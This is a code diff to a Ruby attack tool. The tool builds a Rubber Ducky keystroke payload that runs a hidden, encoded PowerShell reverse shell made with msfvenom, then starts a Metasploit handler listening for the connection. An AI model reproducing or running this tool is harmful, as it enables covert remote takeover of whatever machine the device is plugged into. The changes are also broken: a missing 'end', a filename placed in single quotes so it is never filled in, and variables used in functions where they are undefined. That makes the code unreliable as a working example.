@@ -52,6 +52,15 @@ def select_port
   end
 end
 
+def select_output
+  output = rgets('Name for the payload.txt: ')
+  if output == ''
+    output = 'payload.txt'
+    print_success("Using #{output}\n")
+    return output
+end
+
+
 def shellcode_gen(msf_path, host, port)
   print_info("Generating shellcode\n")
   msf_command = "#{msf_path}./msfvenom --payload "
@@ -103,7 +112,7 @@ def ducky_setup(encoded_command)
   s = "DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\n"
   s << "STRING powershell -nop -wind hidden -noni -enc #{encoded_command}\n"
   s << 'ENTER'
-  File.open('powershell_reverse_ducky.txt', 'w') do |f|
+  File.open('#{rc_file}', 'w') do |f|
     f.write(s)
   end
   print_success("File Complete\n")
@@ -112,14 +121,14 @@ end
 def metasploit_setup(msf_path, host, port)
   print_info("Setting up Metasploit this may take a moment\n")
   rc_file = 'msf_listener.rc'
-  file = File.open("#{rc_file}", 'w')
+  file = File.open("#{output}", 'w')
   file.write("use exploit/multi/handler\n")
   file.write("set PAYLOAD #{@set_payload}\n")
   file.write("set LHOST #{host}\n")
   file.write("set LPORT #{port}\n")
   file.write("set EnableStageEncoding true\n")
   file.write("set ExitOnSession false\n")
-  file.write('exploit -j')
+  file.write('exploit')
   file.close
   system("#{msf_path}./msfconsole -r #{rc_file}")
 end
@@ -138,7 +147,7 @@ begin
   encoded_command = shellcode_gen(msf_path, host, port)
   ducky_setup(encoded_command)
   msf_setup = rgets('Would you like to start the listener?[yes/no] ')
-  print_info("Compile powershell_reverse_ducky.txt with duckencode.jar\n")
+  print_info("Compile #{output} with duckencode.jar\n")
   metasploit_setup(msf_path, host, port) if msf_setup == 'yes'
   print_info("Good Bye!\n")
 end
